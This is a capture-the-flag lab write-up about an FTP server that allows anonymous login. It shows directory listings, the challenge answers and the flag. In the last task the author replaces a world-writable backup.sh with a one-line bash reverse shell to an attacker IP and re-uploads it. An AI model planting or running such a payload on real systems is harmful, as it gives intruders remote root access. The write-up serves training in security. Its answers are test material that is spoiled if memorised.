# Day 9. `[Networking]` Anyone can be Santa
## Intro
>Even Santa has been having to adopt the "work from home" ethic in 2020. To help Santa out, Elf McSkidy and their team created a file server for The Best Festival Company (TBFC) that uses the FTP protocol. However, an attacker was able to hack this new server. Your mission, should you choose to accept it, is to understand how this hack occurred and to retrace the steps of the attacker.

## Tasks

### 1. Name the directory on the FTP server that has data accessible by the "anonymous" user `[******]`
```terminal
martin@box$ ftp 10.10.000.000
Connected to 10.10.000.000.
220 Welcome to the TBFC FTP Server!.
Name (10.10.000.000:martin): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.        #This for some reason wouldn't work without passive mode enabled
ftp> ls
227 Entering Passive Mode (10,10,000,000,146,237).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 16 15:04 backups
drwxr-xr-x    2 0        0            4096 Nov 16 15:05 elf_workshops
drwxr-xr-x    2 0        0            4096 Nov 16 15:04 human_resources
drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 public
226 Directory send OK.
ftp> cd public
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (10,10,000,000,114,172).
150 Here comes the directory listing.
-rwxr-xr-x    1 111      113           341 Nov 16 19:34 backup.sh
-rw-rw-rw-    1 111      113            24 Nov 16 19:35 shoppinglist.txt
226 Directory send OK.

```
Answer = `public`

### 2. What script gets executed within this directory? `[******.**]`

As we can see from above:

Answer = `backup.sh`

### 3. What movie did Santa have on his Christmas shopping list? `[*** ***** *******]`

Unfortunately, due to the server requiring passive mode on in able to do anything, this stopped me from being able to pull anything off of the server via the `ftp` command. I decided just to go ahead and download an ftp client to continue, and downloaded both `shoppinglist.txt` and `backup.sh`.

Answer = `The Polar Express`

### 4. Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt! `[***{*********************}]`

```bash
$ nano backup.sh
-------------------------------------------
#!/bin/bash

bash -i >& /dev/tcp/10.10.000.000/4444 0>&1
```


I just followed the procedure for a standard reverse shell in bash. Unfortunately this did not work on my own machine or a server I have access to in Paris for some reason. So I had to use their own attackbox.

Answer = `THM{even_you_can_be_santa}`

---
```
Tags:
    ftp
    netcat
    reverse shell
```